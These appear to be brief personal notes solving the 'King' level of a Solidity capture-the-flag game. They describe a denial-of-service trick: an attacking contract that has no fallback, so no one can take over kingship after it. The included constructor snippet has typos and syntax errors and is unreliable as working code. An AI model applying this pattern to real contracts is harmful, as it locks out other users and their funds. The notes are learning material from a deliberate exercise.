# King

---
Objective: 
- Your goal is to break it.
---

Notes:

Become the king by sending more ETH than price
ETH sent will be sent to previous king
Beat the leven by denying anyone from claiming kingship

Focus on the prize

Call `receive` with some eth

Setting our hack contract with a consstructor that does not give up its place.

Can be done with not having a `fallback()`

```solidity
constructor(adress payable target) payable {
        uint prize = King(target).prize;
        (bool ok,) = target.call{value: prize}("");
        require((ok, "call failed"));
    }
```